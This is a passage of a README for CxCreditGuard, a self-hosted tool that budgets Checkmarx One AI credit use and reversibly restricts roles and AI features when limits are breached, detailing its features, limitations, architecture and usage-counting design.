# CxCreditGuard

Self hosted governance for Checkmarx One AI credit consumption. Checkmarx One
spends AI credits on AI Triage, AI Remediation, DAST correlation, Fusion scans
and Auto Triage, but does not let you budget those credits per user, group,
project or application. CxCreditGuard polls consumption on a schedule, compares
it against limits you define, and can restrict access when a limit is breached.

Every restriction it makes is recorded with the state needed to undo it, and is
reversible from the GUI with one click.

> **New here?** The [**User Guide**](docs/user-guide.html) (`docs/user-guide.html`)
> is a self-contained HTML walkthrough — deploy, first-time setup, daily use and
> the operator runbooks — written for administrators. Open it in any browser.
> This README is the deeper architecture, security and configuration reference.

## Features and limitations

The same list is on the app's **About** page (Settings → About, or *About* in
the user menu) and in the [User Guide](docs/user-guide.html#features). Each
point links to the section below that explains it.

### What it does

**Measure and attribute**

- Reads AI credit use from Checkmarx One on a schedule (every 15 minutes by
  default) for every user, group, project and application
  ([How usage is measured](#how-usage-is-measured)).
- Counts each billed action from Checkmarx One's credit activity log in the
  period it happened in, against its project and application **by id** and its
  person by email or username (the default usage source). Identical actions in
  the same second are each counted, never merged
  ([The credit activity log](#the-credit-activity-log-the-default-usage-source)).
- Falls back to the consumption summary (totals matched by name) while the
  activity log cannot be read, and never counts the same usage from both.
  Settings → Schedule & data can use the summary only.
- Once a day, checks that the activity log adds up to the summary's total over
  the same 30 days, and shows a mismatch in Diagnose.
- Integration accounts (bots, Auto-triage, Auto-remediation, accounts you list)
  count towards their project's budgets, and towards a person's budget only when
  their project had no active project budget at the time: never towards two user
  budgets ([Integration accounts](#integration-accounts)).
- Matches each usage row to a Checkmarx user: exactly where it can, by name
  similarity where not. Unsure matches wait for an admin to confirm
  ([Attribution](#attribution)).
- Shows the usage that counts towards no budget, and why: automation (Auto
  Triage, bots, integrations without an email), people it could not match, and
  project or application names that match no project (an admin can map them)
  ([Attribution](#attribution)).
- Can also charge a project's Auto Triage credits to the person whose scan set
  it off, off by default ([Charging auto triage](#charging-auto-triage-to-the-person-who-started-the-scan)).
- Overview of spend over time, by action type and by top consumers, with each
  budget marked ([The GUI](#the-gui)).
- Explains a figure: each budget shows what Checkmarx reported and what the
  period's starting point discounted; `scripts/diagnose_usage.py` walks the
  whole chain ([Runbook](#runbook-a-figure-on-screen-does-not-match-checkmarx)).

- **Fast check**, on by default: every 15 seconds, between cycles, the newest
  rows of the activity log are counted and a budget they take over its limit is
  restricted within seconds, through the same recount, ceilings and pause as a
  cycle; optionally triggered at once by a Checkmarx One webhook when a scan
  ends ([Faster enforcement](#faster-enforcement-the-fast-check-headroom-and-the-webhook)).

**Budgets and requests**

- Budgets per user, group, project or application: monthly, quarterly, a custom
  range or lifetime.
- A warning when usage reaches a set share of the budget (80% by default).
- Every new budget only monitors until you switch it to enforce.
- Exemptions, permanent or until a date, for people and projects that must
  never be restricted.
- Bulk edit, and import and export as CSV.
- Credit requests: when an admin allows it, viewers ask for more budget; an
  admin approves in full or in part, optionally until a date, or refuses with a
  reason.
- Optional automatic approval of small increases, up to a cap you set (off by
  default).
- Reports: where each budget is heading this period, chargeback by business
  unit (with a cost per credit if you set one), and a weekly summary by email
  (off by default).

**Enforcement and safety**

- At the limit, an enforcing budget removes a person's AI roles, or turns off
  Auto Triage, PR triage and remediation and Fusion (your choice) on the
  projects it covers ([What the enforcement actions actually are](#what-the-enforcement-actions-actually-are)).
- Records what was there before every change; *Restore access* puts it back in
  one click.
- Gives access back by itself when usage drops under budget, the budget is
  raised or a new period starts (unless the budget is set to hold until
  released).
- Simulation: a dry run of the next cycle showing who would be warned and
  restricted, before anything happens.
- Enforcement coverage (Simulation and Settings → Enforcement; opening it reads
  the tenant's composite roles and the AI holders' groups from IAM, bounded and
  cached for six hours, five minutes when the tenant could not be read): how many of the
  people holding an AI role a user restriction could actually take it from,
  how many keep it through a composite role or a group, and how many are
  protected; it warns when user budgets will not bite and names the tenant's
  dedicated AI roles, without changing the role list.
- Safety ceilings: a cycle about to restrict more than 25 budgets or 100 users
  and projects restricts nobody and pauses itself; a pause switch stops new
  restrictions at once; a sudden fall in reported usage is held until later
  readings confirm it ([Enforcement safety](#enforcement-safety)).
- Everyone over an enforcing user budget is restricted, administrators
  included. Where someone keeps an AI role through a composite role
  (`ast-admin` contains `create-fusion-scan`) or a group, CreditGuard removes
  what it can (nothing, if no AI role is mapped to them directly), records it
  in the audit log, raises a warning once per period ("is over budget and was
  restricted, but keeps ... through ...; the restriction cannot stop them using
  Fusion") naming what to remove in Checkmarx One, and the Simulation shows
  "Would enforce: Yes (cannot fully bite: keeps ... through ...)".
- The account the API key belongs to is never restricted: restricting it could
  remove rights CreditGuard needs to restore others. It is audited and reported
  instead. Protected roles (none by default) can be listed under Settings →
  Enforcement to shield their holders the same way.
- Recount before restricting (always on): just before a new restriction of a
  monthly or quarterly budget, the budget's period is recounted straight from
  the Checkmarx activity log, independently of CreditGuard's own counters, and
  the restriction is applied only if that recount is also at or over the
  limit. When the counts disagree, or the recount cannot be done, nothing new
  is restricted: a warning says why and Diagnose shows it
  ([Recount before restricting](#recount-before-restricting)).
- Readiness checklist (Settings → Enforcement and Diagnose): connected,
  activity log readable, counts match Checkmarx, self-test passed on a user and
  a project, dry run reviewed. A new install starts watch-only and turns
  enforcement on once every item is green, or with an override an admin types
  (audited) ([Readiness checklist](#readiness-checklist)).
- Enforcement self-test (Settings → Enforcement, admins only): restricts a
  chosen user and/or project for real, through the code a budget breach uses,
  reads it back (and says when a user keeps an AI role through a group or a
  composite role, so a restriction cannot bite), restores it from its snapshot
  and checks every setting reads exactly as before, with a per-setting diff and
  timings ([Enforcement self-test](#enforcement-self-test)).

**Watch and alert**

- Reads each restriction back and puts it back if someone undid it in
  Checkmarx One ([Policy violations](#policy-violations)).
- Policy violations (admins only): settings switched back on, Fusion scans
  during a restriction, usage still rising after one.
- A Notification Center, with copies by email and webhook (optionally signed),
  filtered by severity ([Notification delivery](#notification-delivery)).
- Checks the API key's permissions and says what is missing before it matters
  ([The key permission check](#the-key-permission-check)).
- An audit log of every action and change, hash-chained so that an edited or
  deleted entry can be detected.

**Operate**

- Runs on your own server: one container with SQLite, or Compose with
  PostgreSQL behind an HTTPS proxy ([Deploy](#deploy)).
- Admin and viewer accounts, two-factor sign-in with recovery codes, password
  reset by email ([Accounts](#accounts)).
- In-app updates for the single container: signed releases, installed in a
  quiet hour, rolled back if the new version does not start ([Updates](#updates)).
- Configuration backup (settings, budgets, exemptions) to download, email or
  restore; Compose also dumps the database daily ([Backup and restore](#backup-and-restore)).
- Demo mode with made-up data that never touches a tenant
  ([Trying it without a tenant](#trying-it-without-a-tenant)).
- Two looks, Standard and Command Center, each in light and dark.

**What it connects to.** Your Checkmarx One tenant; your mail server and your
webhook, only if you set them up; and, only with a registry token entered under
Settings → Updates, GitHub's container registry (`ghcr.io` and
`pkg-containers.githubusercontent.com`) to check for and download releases. No
telemetry, no analytics, and nothing else is contacted.

### Limitations

| Limitation | What it means for you |
| ---------- | --------------------- |
| **It acts once Checkmarx bills the credits**, not the moment they are spent. | Credits appear in Checkmarx One only once it bills the action, usually when a scan finishes, so **the scan that crosses a budget usually completes**. The fast check restricts within seconds of the credits appearing (every 15 seconds by default); set a budget's **headroom** to stop the scan that would overrun it, by restricting while a few credits are still left. Without the fast check, or while the activity log is unavailable, budgets are judged once a cycle (every 15 minutes by default). A large group or application is restricted over several cycles (at most 1,000 changes a cycle by default; [Sizing and scale](#sizing-and-scale), [Faster enforcement](#faster-enforcement-the-fast-check-headroom-and-the-webhook)). |
| **It restricts access, it does not meter credits.** | It removes roles and turns settings off; it cannot stop an action already running or cap a budget to the exact credit. |
| **Only roles held directly are removed.** | An AI role a person holds through a group or a composite role stays in effect. CreditGuard says so once and never changes the group or role, because that would affect everyone in it. Remove it there in Checkmarx One, or exempt the person ([Restricting a user, in detail](#what-the-enforcement-actions-actually-are)). |
| **User budgets may not bite at all.** | A user budget cannot stop someone who gets Fusion through a composite role: `ast-admin` (held by 274 of 296 users on a live tenant) and `scan-fusion` both contain `create-fusion-scan`, so removing the direct mapping takes nothing away. Such a person is still restricted, and CreditGuard warns once per period that the restriction cannot fully bite and what to remove. The fix is on the tenant: give people `ast-scanner` or `ast-risk-manager` (which contain no AI role) plus `create-fusion-scan` directly where they should run Fusion. Check *Enforcement coverage* (Simulation or Settings → Enforcement) before relying on user budgets. Project, group and application budgets do not depend on roles: they turn AI features off on the projects. |
| **A project budget does not stop people's own AI Triage and AI Remediation.** | Turning project features off leaves what people start themselves working; only a user budget stops that ([What the breach and restriction messages say](#what-the-breach-and-restriction-messages-say)). |
| **Account-wide Auto Triage may override a project.** | If Auto Triage is switched on for the whole account and projects cannot override it, turning it off on one project does not hold. CreditGuard notices on the second read-back and says so once: turn it off in the account's Auto Triage settings, or exempt the project. |
| **Turning Fusion off is not airtight.** | A scan started with its own settings may still run Fusion; the lock against that is not verified. The AI engine can still run without Fusion, and whether that costs credits is not known. Such scans are recorded as [policy violations](#policy-violations). |
| **A user restriction removes the Fusion and LLM roles.** | By default `create-fusion-scan` (the role that spends credits), `manage-fusion`, `update-llm-scan-mode` and `manage-llm-configuration`. The composites `scan-fusion` and `fusion-manager` are left alone, because removing them would also take ordinary scanning or tenant-settings rights, and `ai-triage-assist` can never be chosen: removing it breaks Auto Triage. An install that had chosen other roles keeps them (Settings → Enforcement, *Roles a user restriction removes*). |
| **Monthly and quarterly budgets restrict only on usage the activity log counted.** | Usage the consumption summary counts (after a fallback to it, from a group's own summary row, or with *Usage source: Summary only*), and auto-triage charged to the person who started a scan, still count, warn and show everywhere, but never start a new restriction of a monthly or quarterly budget: from running totals the summary cannot always tell a glitch from a real fall. Such a budget over its limit gets a warning (*over budget on summary totals; not restricted*), and the Overview and Budgets pages show *Restrictions paused for period budgets* while the log is unavailable; so does Diagnose. On a tenant without the activity log no monthly or quarterly budget restricts unless you choose *Summary only* and turn on *Allow restrictions from summary totals (less accurate)* (an install that had chosen *Summary only* before this keeps restricting: the upgrade turns it on). Restrictions already in force stay; lifting works as before; lifetime, custom and count-existing budgets restrict on summary totals as before ([Restrictions from summary totals](#restrictions-from-summary-totals)). |
| **A new period-budget restriction needs the activity log to agree.** | Before a new restriction of a monthly or quarterly budget, its period is recounted from the Checkmarx activity log, read afresh (the last 30 days, or the last 90 for a quarter or a month that began more than 30 days ago), within the activity page cap and the cycle's time budget. If the log cannot be read, the read is cut short, or the recount is under the limit, nothing new is restricted and a warning says why; this holds with *Summary only* too. The last day or two of a 92-day quarter fall outside the 90-day window, so late in such a quarter the recount can fall short and hold a restriction back (never the other way). The Simulation does not run the recount: it marks such rows *would restrict if the recount agrees*. Restrictions in force, lifts, and lifetime, custom and count-existing budgets are unaffected ([Recount before restricting](#recount-before-restricting)). |
| **A new install watches only until it is ready.** | A new install starts with enforcement paused (watch-only): it warns but restricts nobody until the readiness checklist is green, or an admin overrides it by typing ENFORCE (audited, with the items that were not green). An existing install keeps its setting and sees the checklist for information. Once enforcement is on the checklist never turns it off; an item that turns red raises a warning ([Readiness checklist](#readiness-checklist)). |
| **A few cycles of usage are not counted when the usage source switches.** | When the activity log becomes the source (the setting turned on, or the log back after failing), its first read only records what it holds: what happened since the summary's last reading is not counted. When the summary takes over (the setting turned off, the log refused or malformed, or failing for more than an hour), its first two readings count nothing: about two to three cycles are not counted, and a name missing from the summary across the switch counts nothing when it returns. While the log fails for less than an hour nothing new is counted; it is counted when the log answers again. A row reaching the log more than about two hours late is counted only by the daily full read, and only if dated after the switch; rows of the same second that meet at a page boundary wait for a later cycle. A group budget taken over by the log from its own summary row counts no event dated before the takeover, and two group readings count nothing when the row takes it back ([Switching source](#switching-source-and-what-is-not-counted)). |
| **Figures only cover Checkmarx's lookback window.** | The consumption summary reports totals over a window (at most the last year), and the activity log covers the last 30 days. "Lifetime", custom and count-existing budgets read the summary's totals, so they mean everything in that window. Monthly and quarterly budgets do not count credits spent before the period opened (or before the budget was created), unless the budget is set to ([How usage is measured](#how-usage-is-measured)). |
| **Unmatched usage counts against nobody.** | Credits reported under a name that matches no Checkmarx user, or an unconfirmed match, count towards no person's budget until an admin maps them (Settings → Attribution); a mapping counts from then on. Automation counts towards a person only by the [integration-account rule](#integration-accounts) (Auto-remediation towards nobody: no scan initiator is traced for it). With the summary as the source, project usage reported under a repository name that is no project (87% of project credits on a live tenant) counts towards no project, group or application budget until mapped; the activity log names projects by id. All of it is shown on the Overview. |
| **Credits per action are measured, not quoted.** | Checkmarx's listed rate is not what a Fusion or DAST correlation action costs (on a live tenant about 109 credits per Opus 5.5 Fusion scan against a rate of 2). Where they disagree, messages price an action at the feed's average over the lookback window and say so; it is an average, not the cost of one scan. |
| **It cannot say who undid a restriction.** | Checkmarx One does not report who switched a setting back on. By default each restriction is read back once an hour (`verify_interval_minutes`), so a setting switched back on can stay on for up to about that long, and one undone and redone between two read-backs is not seen. |
| **Some Checkmarx behaviour is not yet verified on a real tenant.** | Where a person's roles come from (groups, composite roles); the Fusion lock and the repository's Fusion setting; usage rows per group (only ever seen empty; the sum of its projects is used instead); writes of PR triage and remediation and Auto Triage in the shape a live tenant reads them (sent back as read, never tested by a write on one); finding a project's repository (without it, PR triage and remediation is skipped there); whether a Fusion setting the project inherited can inherit again after Restore (for now it is restored on the project itself). Each degrades safely and says so rather than guessing ([Remaining unknowns](#remaining-unknowns)). |
| **Tested to 2,000 projects on a synthetic tenant.** | Load tested with 2,000 projects and 1,000 users made up for the test, not on a real tenant of that size. Use PostgreSQL above about 500 projects or 300 users ([Sizing and scale](#sizing-and-scale)). |
| **One instance only.** | A second copy against the same database refuses to start. Availability comes from restarting the one copy, not from running several ([One instance only](#one-instance-only)). |
| **The database is the only record of how to undo a restriction.** | The in-app backup holds configuration only. Back the database up; after restoring an older one, restrictions made since it was taken have to be given back by hand in Checkmarx One ([Backup and restore](#backup-and-restore)). |
| **Updates are only as trustworthy as the release signing key.** | Until the image carries the release signing key, auto-update installs nothing and a manual install cannot be verified. Updates need a registry token, and only the single container updates itself: Compose shows the steps instead. Operating system, Python and OpenSSL fixes need a new image ([Updates](#updates)). |
| **The audit log is tamper-evident, not tamper-proof.** | An edited or deleted entry is detected, but someone with full write access to the database could rewrite the whole chain. |

## High-level architecture

CxCreditGuard is **one deployable unit**: a FastAPI backend that also serves the
React single-page app from the same origin, a background scheduler running in the
same process, and a database (SQLite by default, PostgreSQL for the hardened
deployment). The external system it works with is Checkmarx One, reached only
through a single hardened HTTP client; beyond that it sends mail and webhooks
only when they are set up, and the in-app updater reads GitHub's container
registry only once a registry token is entered (see [Updates](#updates)).

Everything of consequence happens in one loop, `services/cycle.py`, run on a
schedule or on demand via `POST /api/ops/run-cycle`:

```
                         Checkmarx One APIs
                   (IAM · projects · usage · AI toggles)
                                 ▲   │
             role / toggle       │   │   poll consumption
             writes (enforce)    │   │   sync org model
                                 │   ▼
   ┌────────────────────────────────────────────────────────────────┐
   │                    cycle.py  (one orchestrator)                │
   │                                                                │
   │    org_sync  ─▶  ingestion  ─▶  evaluation  ─▶  enforcement  │
   │    users,        snapshots +    usage vs        reversible     │
   │    projects      attribution    limits,         role / AI      │
   │                  (fuzzy match)   period          changes, with │
   │                                  ledger          an undo snap  │
   │                                      │                         │
   │                                      ▼                         │
   │                              notifications                     │
   └────────────────────────────────────────────────────────────────┘
        │ reads / writes                        │ email · webhook
        ▼                                        ▼
   Database (SQLite / PostgreSQL)          Operators + the React GUI
   snapshots, limits, enforcement,         (served from the same origin)
   audit log, accounts, notifications
```

- **Poll, don't stream.** Checkmarx reports *aggregate totals over a lookback
  window*, not events, so per-period usage is the sum of the increases between
  readings (see [How usage is measured](#how-usage-is-measured)).
- **Attribute, don't guess.** Each usage row is matched to a synced user — first
  exactly, then by similarity — and anything uncertain is surfaced for review
  rather than billed to the wrong person.
- **Act reversibly.** Before any enforcement the prior state is snapshotted, so
  every restriction is one click to undo.
- **One-way dependencies.** `api` and `scheduler` call `services`; `services`
  call `checkmarx` and `models`; nothing below `services` knows the web layer
  exists. The [Code layout](#code-layout) section maps this to files.

## Build status

| Step | Area | State |
| ---- | ---- | ----- |
| 1 | Skeleton, schema, migrations, utility auth, containers | Done |
| 2 | Checkmarx auth: API key parsing, token exchange, refresh | Done |
| 3 | Org model sync (users, groups, projects, applications) | Done |
| 4 | Usage ingestion and attribution | Done |
| 5 | Limit engine and evaluator | Done |
| 6 | Enforcement service with reversibility and idempotency | Done |
| 7 | Scheduler wiring | Done |
| 8 | GUI: Setup, Dashboard, Limits, Notifications, Audit, Settings | Done |
| 9 | Notification delivery (email, webhook), retention, security review, docs | Done |

`POST /api/ops/run-cycle` performs a full sync, ingest, evaluate and enforce pass
and returns per step statistics, and the GUI drives the same endpoints.

About 1,000 tests cover the backend, with every Checkmarx endpoint served by an in-memory
fake tenant (`backend/tests/fake_tenant.py`) that holds mutable state, so tests
assert on what enforcement actually changed rather than on which calls were made.
The frontend is type checked with `tsc` on every build.

### Checkmarx One scan and security posture

The codebase has been scanned with Checkmarx One (project `CxCreditGuard`) across
all five engines — SAST, SCA, KICS/IaC, Containers and Secret Detection — and the
findings attributable to this repository have been remediated. Remediation cut the
total from **416 to 237**:

| Severity | Baseline | After remediation |
| -------- | -------- | ----------------- |
| Critical | 30 | 12 |
| High | 149 | 93 |
| Medium | 143 | 68 |
| Low | 78 | 52 |
| Info | 16 | 12 |
| **Total** | **416** | **237** |

**What was remediated:**

- **Container images.** The runtime moved from Debian `python:3.11-slim` to
  `python:3.11-alpine` (both `backend/Dockerfile` and `deploy/podman/Dockerfile`),
  and the proxy to `nginx:1.27-alpine-slim`. Debian's userland (apt, perl,
  coreutils, tar) was the source of ~175 OS-package CVEs; Alpine carries a small
  fraction. psycopg runs in its pure-Python mode against the system `libpq`, since
  `psycopg[binary]` ships glibc-only wheels.
  Since then the runtime base is `python:3.13-alpine3.24` (the 3.11 images still
  carry pip 24.0, setuptools and wheel with known CVEs), the build runs
  `apk upgrade` so the base's OS packages take Alpine's later fixes, and every
  base image (Python, Node, `postgres:16.16-alpine3.24`, the proxy's
  `nginx:1.30.8-alpine3.24-slim`) is pinned by tag and digest.
- **IaC (KICS).** `HEALTHCHECK` on both images; the unpinned `apt-get install curl`
  layer removed (the health check uses the bundled interpreter); `cap_drop: ALL`
  plus a minimal `cap_add` and `no-new-privileges` on the `db` and `proxy`
  services; no password literals in `.env.example`.
- **Secret Detection.** The JWT-shaped fixture in `backend/tests/test_token.py` is
  built at runtime, so no token-like literal is committed.
- **Logging (SAST).** Control characters are escaped in every rendered log record,
  closing the log-forging class as defence in depth.

**Residual findings and why they remain open:**

- **SAST** (`Reflected_XSS`, `Stored_XSS`, `Trust_Boundary_Violation`,
  `Information_Exposure`, `Client_Server_Empty_Password`) are false positives for
  this architecture: the backend is a JSON API with no server-side HTML rendering,
  and the React SPA escapes output. The correct disposition is a `NOT_EXPLOITABLE`
  triage in Checkmarx, not a code change.
- **KICS** residuals are the scanner matching env-var *names* (`POSTGRES_PASSWORD`)
  as secrets and flagging the presence of a `cap_add` block, plus the privileged
  ports (80/443) inherent to a public reverse proxy.
- **Containers** — the remaining OS-package CVEs live in `postgres:16-alpine`
  (already the latest of its major line; a major bump requires a data migration)
  and a small Alpine residual; these are upstream and clear only as the base-image
  publishers ship patches.
- The `esbuild` SCA advisory (GHSA-gv7w-rqvm-qjhr) affects only esbuild's Deno
  distribution; this project builds with vite via the npm/Node distribution and is
  unaffected. It is triaged `NOT_EXPLOITABLE`.

Dependency audits are clean on both sides (`pip-audit --strict` over the resolved
requirements, `npm audit`).

## How usage is measured

This matters more than any other design decision here, and it is not obvious.

There are two sources. By default the **credit activity log**
(`GET /api/credits/activity`, one row per billed action, with its date and its
project's id) feeds the budgets of projects, users and applications: see
[The credit activity log](#the-credit-activity-log-the-default-usage-source).
The **consumption summary** below is read every cycle all the same: it feeds
everything the log does not cover (a group's own row, lifetime, custom and
count-existing budgets, which read its totals), the dashboard and Attribution,
and it takes over whenever the log cannot be read. With the setting *Usage
source: Summary only* it is the only source, exactly as before the log was used.

`GET /api/credits/consumption` returns **aggregate totals over a lookback
window**, not a stream of timestamped events. There are no event ids, no
timestamps and no project ids in the user view. So per-period usage cannot be
summed from events. Instead:

1. Each cycle polls the endpoint per dimension and stores the reported totals
   (`usage_snapshot` and `usage_record`, with each row's raw payload kept for a
   week for audit; see [Data retention](#data-retention)).
2. Each reading is compared with the previous one, name by name, and every
   increase is added to the counter of each budget the name counted towards at
   that moment (the **usage ledger**, see
   [Where a name's usage counts](#where-a-names-usage-counts-the-usage-ledger)).
3. Usage for a monthly or quarterly period is its counter: the increases
   observed while the period was open.

**Whether history counts depends on the period type:**

| Period | Usage | Why |
| ------ | ----- | --- |
| Lifetime | Everything reported: the current totals of the names that count towards it. | "Lifetime" means all credits ever. Discounting history would silently redefine it as "since the limit was created", and a budget of 10 against 13 already spent would read as 0 used and within budget. |
| Custom range | Everything reported, as for lifetime. | The admin chose the window explicitly and expects consumption inside it to count. |
| Monthly, quarterly | The increases observed during the period. | The lookback window is wider than the period and the API does not say *when* inside it credits were spent, so counting the lot would let a year of history exhaust a fresh monthly budget on day one. Set `count_existing_usage` on the limit to count it anyway (it then counts like a lifetime budget, from the baseline taken when the period opened). |

The Limits page shows the reported total and the part of it not counted in this
period underneath the usage bar, so a project that Checkmarx says used 13 credits
reading as 0 against its budget is explained rather than mysterious.

For a budget that counts the reported totals, if the lookback window slides far
enough that the reported total falls below the baseline, the baseline is lowered to
match, so usage never goes negative and a stale high baseline cannot mask real
consumption.

Usage per entity level (period budgets read the activity log while it is the
source; the summary column is what they read otherwise, and what lifetime,
custom and count-existing budgets read always):

| Level | Activity log | Summary |
| ----- | ------------ | ------- |
| User | events by email, else username, else unmatched (integration accounts: see below); plus, only with auto-triage charging on, their share of the auto triage their scans triggered | `viewBy=user`, attributed to a synced IAM user; plus the same auto-triage share |
| Application | events whose `applicationIds[0]` is it, or whose project is one of its projects | `viewBy=application`, falling back to the sum of its projects |
| Project | events whose `projectIds[0]` is it | `viewBy=project` |
| Group | events of its projects (unless its own summary row feeds it), plus of its members when `include_member_usage` is on, each once | `viewBy=group` when the group appears in the response, otherwise the sum of the group's projects, plus member users when `include_member_usage` is on |

### The credit activity log (the default usage source)

```
GET /api/credits/activity?period=last_30_days&page=1&size=500&sort_by=date&sort_order=asc
{"items": [{"date": "2026-11-25T10:21:28Z", "action": "Fusion Scan - Opus 5.5",
            "creditsUsed": "144.5", "user": "jdoe", "userEmail": "",
            "projectIds": ["<uuid>"], "applicationIds": [], "scanIds": ["<uuid>"],
            "scanner": "sast", ...}],
 "totalItems": 1939, "totalPages": 20, "currentPage": 1}
```

On a live tenant 30 days held 1,939 rows whose `creditsUsed` (a string) added
up exactly to the summary's total; every row had one project id and 68 an
application id; `userEmail` was empty on 1,511 rows. Each cycle reads it first
(`app/services/activity_source.py`, `app/checkmarx/activity.py`) and adds every
**new event** to the month's and the quarter's counter, **of the period of the
event's own date**, of each active budget it counts towards and that was created
before it happened:

* its project's budgets, by `projectIds[0]` (no name matching);
* the project's groups' budgets, as the ledger feeds them (not a plain group
  budget its own summary row feeds);
* its application's budgets: `applicationIds[0]` and the project's synced
  applications, once;
* its person's budget (and group budgets that include member usage): the IAM
  user by `userEmail`, else by `user` as username (with an admin's mapping and
  the summary's matching ladder: unambiguous full name, confident similarity),
  else nobody, and the name is raised under Settings → Attribution to be mapped
  (from then on);
* each budget counts an event once (a group budget that includes member usage
  too, where the summary adds its project and member views).

**No row id, so a multiset.** Identical rows are distinct events (59 of the
1,939 rows were exact duplicates of another, to the second): nothing is ever
deduplicated. A row's identity is the fields that describe the action itself
and are assumed never to change for a past action (date, action, credits,
project ids, scan ids, scanner), hashed, and `usage_activity_key` keeps how many
rows of each identity have been seen. Who (user, email) and the application are
left out because Checkmarx may fill them in or change them later for the same
action: the new events of an identity count towards a person or an application
only when every row of it in the read names the same one (which of differing
rows is new cannot be told), and otherwise only towards its project and what
the project belongs to (**not counted** towards the person or application then). A
fetch holding `n` rows of an identity counts `max(0, n − seen)` new events and
raises `seen` to `n`, in the transaction that feeds the counters, under the
attribution lock. Nothing is written while Checkmarx is called: every page is
read first. Keys are pruned 31 days after their date, and an event older than
that - or than the highest cutoff ever used, should the clock go back - is never
counted.

**Fetching so that no row is read twice.** Pages are read in ascending order of
`sort_order=asc`: new rows append at the end, and rows ageing out leave from the
front, which moves every row one place earlier, so a row near a page boundary
can be skipped but not read twice. Since each page is a slice of the sorted log
as of its own request, a row read on one page can turn up again on a later page
only if every boundary in between has the same date on both sides. So at each
boundary: a later date on the next page proves no repeat across it; the **same
date** makes that date *uncertain* this cycle (its rows are neither counted nor
recorded, and the next read, with a different page size to move the boundaries,
covers them); an **earlier** date (the order went back) makes the whole fetch
count nothing. Within a page the dates must not go back, or the log is taken as
malformed. With that, no identity is ever read more times than the log holds,
**whether or not the fetch was complete**, so an over-count cannot happen. The
cross-checks — `totalItems` the same on the first and the last page, and as many
rows read as it says lie from the first page read to the end — tell whether a
fetch was complete; an incomplete one is not discarded (what it counted is
safe), it is recorded (`total_changed`, `rows_mismatch`) and its skips are made
up by the next reads.

**Cost.** A normal cycle reads from a page before where the last two hours of
the log began to its end: two or three requests for 100,000 rows in 30 days
(about 2,000 projects). The overlap makes up a row skipped by drift, or arriving
up to two hours late. At most *Activity log pages per cycle* (default 40) are
read, and the cycle's time budget applies; a cycle that stops early counts only
complete dates (the last date read may continue on the next page) and warns,
and the next cycles carry on from there. Once a day the whole 30 days are read
(at most 400 pages), counting rows that arrived late, and their sum is compared
with the summary's total over `last_30_days` (`viewBy=action`): a difference of
more than 0.5% (and a credit) shows as a warning in Diagnose (*Usage source*).

#### Switching source, and what is not counted

The same usage is never counted from both sources:

* **The log becomes the source** (the setting turned on, the first cycle after
  upgrading, or the log back after a fallback): its first fetch only records
  what it holds and counts nothing, and events dated before that moment are
  never counted from it. In the same cycle the summary stops feeding the
  project, user and application views (its readings are still stored, for the
  dashboard, totals and Attribution). **Not counted:** what happened between the
  summary's last reading and that first fetch (about one cycle).
* **The summary takes over** (the setting turned off; a 403, a 404 or a
  malformed answer, tried again after 6 hours; or a 5xx, timeout or rate limit
  lasting more than an hour, or a failure of the activity step itself lasting
  as long): the summary's first two readings of each covered view count
  nothing, and the following ones count increases as before. Those two
  readings also rebase the ledger's memory of names of the covered views:
  every name it remembers (missing, or holding a fall or a ceiling) starts
  from what it reports in the next reading the completeness checks believe
  (a return in a doubted reading counts nothing, nor does its recovery),
  never from a total from before or during the log's era. **Not
  counted:** what happened between the log's last fetch and the summary's third
  reading (two to three cycles), and what a name missing across the switch
  used until it returns. This assumes the summary reports an event no later
  than about two cycles after the log does (they are the same data: their
  totals matched exactly).
* **Group budgets.** The group view is not covered by the log: a plain group
  budget whose group has a row of its own there is fed by that row; otherwise
  (and always with member usage) the log feeds it through its projects and
  members. When the log takes a budget over (the row left, or member usage was
  switched on), it counts towards it only events dated from that moment on;
  when the row takes it back, the group view's next two readings count nothing
  (for every group). **Not counted:** events dated before a takeover that the
  log counts after it (a backlog after an outage, a late row), and those two
  group readings.
* **A shorter outage** keeps the log as the source: nothing new is counted
  meanwhile (the cycle is not fresh, so no new restriction is applied on it),
  and what happened is counted when the log answers again.
* Also not counted: a row that reaches the log more than two hours late and
  before the next daily full read is counted then, but one dated before the
  switch never is; rows of one second at a page boundary wait for a later
  cycle; a row with no date.

#### Restrictions from summary totals

Only usage counted from the activity log can start a new restriction of a
monthly or quarterly budget. Each counter keeps the log's own part
(`usage_activity_counter`); evaluation, the Simulation and the safety ceilings
decide a *new* restriction on that part alone. Auto-triage credits charged to
the person who started the scan always derive from the summary's project
readings, so they count towards the figure and warn, but never start a
restriction either. Usage the summary ledger
counted still lands in the counter, so the figures, reports and warnings are
unchanged: a budget over its limit only because of it gets a warning
notification (*over budget on summary totals; not restricted, because the
activity log is unavailable*) and the note on the Budgets page, and is not
restricted. From running totals the summary cannot always tell a glitch from a
real fall, so it can occasionally over-count; the log cannot.

* A restriction already in force for the period stays in force (and is
  re-asserted and verified as usual); giving access back when usage is under
  the limit or the budget is raised works as before.
* Not affected: lifetime, custom and count-existing budgets, and demo budgets
  in demo mode. They read current totals, not the ledger's counter, so a glitch
  there passes instead of being banked.
* *Usage source: Summary only* is warn-only for monthly and quarterly budgets
  too, unless *Allow restrictions from summary totals (less accurate)* is on
  (`usage.summary_restricts`, off by default), which restores the earlier
  behaviour exactly. Migration `d1e5a7c3b9f2` turns it on for an install that
  had explicitly chosen *Summary only*, so it keeps restricting.
* A restriction already started for the period (applied, or pending: being
  rolled out, or written with an unknown outcome) is carried on; a failed one
  is not in force and is not retried on summary totals. A budget held on
  summary totals that the log later takes over its limit is restricted then,
  and the restriction is announced (the earlier warning does not suppress it).
* The first cycle with the activity log as the source (after an upgrade,
  too) raises one notification saying so and what it means for restrictions,
  and, when the log is not available, how to restrict from summary totals as
  before.
* While restrictions are held this way, the Overview and Budgets pages show
  *Restrictions paused for period budgets* with since when, and Diagnose shows
  it under *Usage source*.

#### Recount before restricting

The fail-safe on top of the rule above (`app/services/recount.py`, always on,
no setting). Just before the evaluation applies a **new** restriction of a
monthly or quarterly budget (pass 3 of the cycle, `_enforce_pending`), the
budget's usage in the period is counted again, independently: straight from
the raw rows of `GET /api/credits/activity`, never from `budget_usage`,
`usage_delta` or the log's own counter. The restriction is applied only when
that recount is also at or over the limit (the evaluation's own threshold:
for a budget with a [headroom](#headroom-restrict-before-the-budget-runs-out),
`limit - headroom`).

* **Where the rows come from.** CreditGuard keeps no raw rows (only how many
  of each identity it has seen), so the log is read afresh, at most once per
  cycle and window: `period=last_30_days` for a month that began within the
  last 30 days, `last_90_days` otherwise and for a quarter. It is read from
